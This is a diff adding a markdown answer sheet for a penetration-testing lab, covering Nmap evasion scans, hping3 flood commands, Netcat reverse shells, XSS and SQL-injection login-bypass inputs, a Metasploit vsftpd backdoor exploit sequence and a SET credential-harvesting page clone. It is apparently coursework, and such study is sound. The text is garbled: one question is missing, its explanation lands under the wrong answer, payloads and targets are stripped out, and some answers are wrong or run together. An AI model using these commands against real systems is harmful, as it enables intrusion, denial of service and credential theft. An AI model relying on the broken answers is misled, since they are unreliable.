@@ -1,0 +1,438 @@
+**1. Perform a stealth scan on the target IP without establishing a full TCP connection. Which Nmap command would you use, and why is it preferred over a full connect scan?**
+
+- **Command:**  
+  ```
+  nmap -sS 
+  ```
+- **Explanation:**  
+  The `-sS` option performs a SYN scan (stealth scan), sending SYN packets and analyzing responses without completing the TCP handshake. This is preferred over a full connect scan (`-sT`) because it is less likely to be logged by the target system, making detection harder.
+
+---
+
+**2. Use Netcat to transfer a file from one machine to another. Set up one machine to listen for incoming connections and the second machine to send the file over the network. Describe the exact commands you would use.**
+
+- **On the receiving machine (listener):**  
+  ```
+  nc -l -p 1234 > receivedfile.txt
+  ```
+- **On the sending machine:**  
+  ```
+  nc  1234  
+  ```
+- **Explanation:**  
+  `--flood` sends packets as fast as possible, `--rand-source` randomizes the source IP, `-S` sets the SYN flag.
+
+---
+
+**4. You're told that this page might be vulnerable to DOM XSS. Someone says to try putting something after ?default= in the URL. Can you make an alert box appear just by changing the URL?**
+
+- **Yes, if the page reflects the value of `default` into the DOM without sanitization, you can use:**  
+  ```
+  ?default=alert(1)
+  ```
+- **Explanation:**  
+  If the input is unsanitized and inserted into the DOM, this will trigger an alert box.
+
+---
+
+**5. Upload the suspicious .exe file to VirusTotal and note the detection ratio along with malware names from different antivirus engines. Then manually open the file using PE Studio and investigate hidden functionalities, suspicious libraries, and anomalies. Determine whether the manual analysis supports or contradicts the VirusTotal results.**
+
+- **Process:**  
+  - Upload to VirusTotal, note detection ratio and malware names.
+  - Analyze with PE Studio: check suspicious imports (e.g., networking, process injection), hidden strings, section entropy, and anomalies.
+  - **Conclusion:** If both tools indicate similar suspicious behavior (e.g., networking, obfuscation), the results support each other. If VirusTotal flags malware but PE Studio finds nothing suspicious, results may contradict.
+
+---
+
+**6. You test another form. This one blocks the word ``, but allows you to use other HTML tags. Can you still make a popup appear using a different tag?**
+
+- **Yes. Example:**  
+  ```
+  
+  ```
+- **Explanation:**  
+  The `onerror` event triggers JavaScript when the image fails to load, causing a popup.
+
+---
+
+**7. Launch the Metasploit Framework on your system. Identify and select the appropriate exploit module for vsftpd 2.3.4 vulnerability. What command do you use to start Metasploit and search for the exploit?**
+
+- **Commands:**  
+  ```
+  msfconsole
+  search vsftpd
+  use exploit/unix/ftp/vsftpd_234_backdoor
+  ```
+
+---
+
+**8. Craft TCP packets with FIN, PSH, and URG flags set and flood the target on port 80. Which Hping3 options should be used?**
+
+- **Command:**  
+  ```
+  hping3 -F -P -U --flood -p 80 
+  ```
+- **Explanation:**  
+  `-F` sets FIN, `-P` sets PSH, `-U` sets URG, `--flood` for high rate.
+
+---
+
+**9. Perform a TCP ACK flood on port 80 to test firewall evasion techniques. Mention the correct Hping3 command.**
+
+- **Command:**  
+  ```
+  hping3 -A --flood -p 80 
+  ```
+
+---
+
+**10. Simulate a UDP flood attack targeting port 53 (DNS service) of the target machine. Write the appropriate Hping3 command.**
+
+- **Command:**  
+  ```
+  hping3 --flood --udp -p 53 
+  ```
+
+---
+
+**11. You are provided with two different suspicious .exe files. Analyze both files using PE Studio and VirusTotal. Compare their behavior indicators and characteristics, then conclude which of the two appears to be more dangerous. Justify your conclusion based on specific analysis points.**
+
+- **Process:**  
+  - Compare detection ratios, flagged behaviors, suspicious imports, and anomalies.
+  - The more dangerous file will have higher detection, more suspicious imports (e.g., networking, code injection), and obfuscation techniques.
+  - **Justification:** Choose the file with more critical flags and behaviors.
+
+---
+
+**12. Think about the same kind of popup as in the first challenge - but now it's saved and shows every time the page loads.**
+
+- **Explanation:**  
+  This indicates a stored (persistent) XSS vulnerability, where malicious input is saved and rendered on every page load.
+
+---
+
+**13. You need to identify the Operating System running on a target machine. Which Nmap command would you use for OS detection?**
+
+- **Command:**  
+  ```
+  nmap -O 
+  ```
+
+---
+
+**14. You want to automatically check the target machine for common vulnerabilities using prebuilt Nmap scripts. Which command would you use and how would you specify the vulnerability category?**
+
+- **Command:**  
+  ```
+  nmap --script vuln 
+  ```
+- **Explanation:**  
+  The `vuln` category runs scripts for known vulnerabilities.
+
+---
+
+**15. After finding a live web server, you want to detect its OS, running services, versions, and run default scripts. Which Nmap option would you use to perform all this information gathering quickly?**
+
+- **Command:**  
+  ```
+  nmap -A 
+  ```
+- **Explanation:**  
+  `-A` enables OS detection, version detection, script scanning, and traceroute.
+
+---
+
+**16. Simulate a slow-rate SYN flood by sending one SYN packet every 10 milliseconds to port 80. Write the Hping3 command to perform this.**
+
+- **Command:**  
+  ```
+  hping3 -S -i u10 -p 80 
+  ```
+- **Explanation:**  
+  `-i u10` sets interval to 10 microseconds; adjust as needed for milliseconds.
+
+---
+
+**17. Set up a Netcat listener that can first receive a file and then upgrade to a remote shell without restarting the connection.**
+
+- **Process:**  
+  - Use a script or manual delimiter to switch from file transfer to shell.
+  - Example: After file transfer, send a shell payload or use a named pipe.
+
+---
+
+**18. Perform a SYN flood attack on port 80 of the target machine to simulate a basic DoS attack. Write down which Hping3 command you would use and why.**
+
+- **Command:**  
+  ```
+  hping3 --flood -S -p 80 
+  ```
+- **Reason:**  
+  Sends a high rate of SYN packets to exhaust server resources.
+
+---
+
+**19. You are working as a cybersecurity intern in a company's Red Team. Your team assigns you a task to simulate a phishing attack to test employee awareness. You are instructed to use the Social Engineering Toolkit (SET) to clone the company's login page (Altro mutual), capture any credentials entered (login ID and password), and analyze the results.**
+
+- **Process:**  
+  - Launch SET: `setoolkit`
+  - Choose Social-Engineering Attacks → Website Attack Vectors → Credential Harvester Attack Method → Site Cloner.
+  - Enter the URL to clone, set listener IP.
+  - Analyze captured credentials in SET logs.
+
+---
+
+**20. After finding open ports, you want to know the specific version of services. Which Nmap option would you use to detect detailed service versions?**
+
+- **Command:**  
+  ```
+  nmap -sV 
+  ```
+
+---
+
+**21. Create a remote shell connection using Netcat where one machine acts as a listener and the other as a client. Demonstrate how to open a reverse shell connection between the two systems.**
+
+- **Listener (attacker):**  
+  ```
+  nc -l -p 4444
+  ```
+- **Victim (reverse shell):**  
+  ```
+  nc  4444 -e /bin/bash
+  ```
+- **(On Windows, use `cmd.exe` instead of `/bin/bash`.)**
+
+---
+
+**22. Without using any online scanners, perform a complete static analysis of the suspicious .exe file using PE Studio. Identify any suspicious imported libraries, hidden strings, anomalies in headers, and anti-debugging techniques. Based solely on your local analysis, determine the most probable malware category for the file.**
+
+- **Process:**  
+  - Check for imports like `WinExec`, `CreateRemoteThread`, networking APIs.
+  - Look for suspicious or obfuscated strings.
+  - Analyze PE headers for anomalies.
+  - Check for anti-debugging code.
+  - **Conclusion:** Classify as Trojan, backdoor, ransomware, etc., based on findings.
+
+---
+
+**23. Use Netcat to test if a specific port is open on a remote machine. Perform a connection test and explain how you would verify if a service is active on that port.**
+
+- **Command:**  
+  ```
+  nc -vz  
+  ```
+- **Explanation:**  
+  `-v` for verbose, `-z` for scanning without sending data. If the port is open, Netcat reports success.
+
+---
+
+**24. Start Metasploit and perform a service version scan using Nmap on the target IP. Search and select the vsftpd 2.3.4 backdoor exploit in Metasploit, configure a reverse shell payload with correct LHOST and LPORT values, and execute the exploit to gain a session on the target. After gaining access, demonstrate how you would interact with the target system using Meterpreter commands.**
+
+- **Steps:**  
+  1. `msfconsole`
+  2. `nmap -sV `
+  3. `search vsftpd`
+  4. `use exploit/unix/ftp/vsftpd_234_backdoor`
+  5. `set RHOST `
+  6. `set LHOST `
+  7. `set LPORT `
+  8. `exploit`
+  9. After session, use Meterpreter commands like `sysinfo`, `shell`, `download`, `upload`.
+
+---
+
+**25. You want to scan extremely slowly to avoid detection by an IDS (Intrusion Detection System). Which Nmap timing option would you use to make your scan very stealthy?**
+
+- **Command:**  
+  ```
+  nmap -T0 
+  ```
+- **Explanation:**  
+  `-T0` is the slowest, most stealthy timing template.
+
+---
+
+**26. Simulate a SYN flood on port 80 using source port 443 to make the traffic look like HTTPS. Write the Hping3 command for this task.**
+
+- **Command:**  
+  ```
+  hping3 --flood -S -p 80 --baseport 443 
+  ```
+- **Or:**  
+  ```
+  hping3 --flood -S -p 80 -s 443 
+  ```
+
+---
+
+**27. You leave a comment on a DVWA page. After submitting it and reloading the page, you see your message - and suddenly, an alert box appears! (Low Security) Challenge: What kind of input could you have typed to cause this?**
+
+- **Input:**  
+  ```
+  alert(1)
+  ```
+- **Explanation:**  
+  This is classic stored XSS.
+
+---
+
+**28. Install Netcat, perform a basic port scan, transfer a small text file from client to server, and finally open a reverse shell connection. Document every command you used during this practical task.**
+
+- **Install:**  
+  ```
+  sudo apt-get install netcat
+  ```
+- **Port scan:**  
+  ```
+  nc -zv  20-1000
+  ```
+- **File transfer:**  
+  - Listener: `nc -l -p 1234 > file.txt`
+  - Sender: `nc  1234  4444 -e /bin/bash`
+
+---
+
+**29. You are on a network where you do not have raw socket privileges. Which Nmap command will you use to perform a normal TCP connection scan?**
+
+- **Command:**  
+  ```
+  nmap -sT 
+  ```
+- **Explanation:**  
+  `-sT` uses the OS's TCP stack, requiring no special privileges.
+
+---
+
+**30. You're testing a form where `` tags are blocked, but you can still insert images or other tags. After you submit your input and refresh the page, a popup appears. What kind of tag might you have used that makes the alert show automatically when the page loads?**
+
+- **Example:**  
+  ```
+  
+  ```
+- **Explanation:**  
+  The `onerror` handler triggers the alert.
+
+---
+
+**31. Use Netcat to test connectivity on open ports and then explain the risks if Netcat listeners are left unattended in a real network environment.**
+
+- **Command:**  
+  ```
+  nc -vz  
+  ```
+- **Risk:**  
+  Unattended Netcat listeners can provide unauthorized remote access, acting as backdoors.
+
+---
+
+**32. You want to perform a stealth scan on a target and also detect detailed service versions at the same time. Which Nmap command combination would you use?**
+
+- **Command:**  
+  ```
+  nmap -sS -sV 
+  ```
+
+---
+
+**33. In the SQL Injection section of DVWA, craft an input that allows you to bypass authentication without knowing any valid username or password. What kind of SQL logic would you use to achieve this?**
+
+- **Input:**  
+  ```
+  ' OR '1'='1' --
+  ```
+- **Explanation:**  
+  This always-true condition bypasses login checks.
+
+---
+
+**34. While scanning a network stealthily, you also want to detect the Operating System of the target machine. Which combined Nmap command will achieve this?**
+
+- **Command:**  
+  ```
+  nmap -sS -O 
+  ```
+
+---
+
+**35. After selecting the exploit for vsftpd 2.3.4, set a Meterpreter reverse shell payload. Configure LHOST and LPORT correctly to match your attack machine settings. Describe the commands you use for payload setup.**
+
+- **Commands:**  
+  ```
+  set PAYLOAD cmd/unix/reverse
+  set LHOST 
+  set LPORT 
+  exploit
+  ```
+
+---
+
+**36. You're testing a web form that shows your input back on the page when you submit it. You notice it doesn't change or block anything you type. Can you make a message box (alert) pop up by entering something special into the input field?**
+
+- **Yes:**  
+  ```
+  alert(1)
+  ```
+
+---
+
+**37. You want to run an aggressive scan (detect OS, services, scripts) quickly without wasting time. Which Nmap options would you combine to perform this fast information gathering?**
+
+- **Command:**  
+  ```
+  nmap -A -T4 
+  ```
+- **Explanation:**  
+  `-A` for aggressive scan, `-T4` for faster timing.
+
+---
+
+**38. Analyze the given .exe file using PE Studio. Identify suspicious headers, API imports, and metadata anomalies. After completing the local analysis, scan the same file using VirusTotal. Compare the findings from both tools and classify the malware type based on your observations.**
+
+- **Process:**  
+  - PE Studio: Look for suspicious imports (e.g., networking, process injection), abnormal section names, entropy.
+  - VirusTotal: Note detection ratio, malware family.
+  - **Classification:** If both tools suggest backdoor behavior, classify as such.
+
+---
+
+**39. Launch an ICMP Echo Request flood (Ping Flood) attack on the target system. Which Hping3 options will you use?**
+
+- **Command:**  
+  ```
+  hping3 --flood -1 
+  ```
+- **Explanation:**  
+  `-1` sets ICMP mode.
+
+---
+
+**40. You want to scan a target machine stealthily by fragmenting packets and using the slowest timing to avoid IDS detection. Which Nmap command combination would you use?**
+
+- **Command:**  
+  ```
+  nmap -f -T0 
+  ```
+- **Explanation:**  
+  `-f` fragments packets, `-T0` is the slowest timing.
+
+---
+
+**41. You've been assigned to perform a security assessment on a university network. The IT department suspects that some unauthorized services are running on student lab machines. You are given access to the network (find IP address) and asked to investigate a suspicious host. Discover all open ports on the target. Detect the services and versions running on those ports. Attempt to identify known vulnerabilities in those services.**
+
+- **Process:**  
+  1. Discover open ports:  
+     ```
+     nmap -p- 
+     ```
+  2. Detect services and versions:  
+     ```
+     nmap -sV 
+     ```
+  3. Identify vulnerabilities:  
+     ```
+     nmap --script vuln 
+     ```
+- **Explanation:**  
+  This sequence provides a thorough assessment of open ports, running services, their versions, and known vulnerabilities.
+
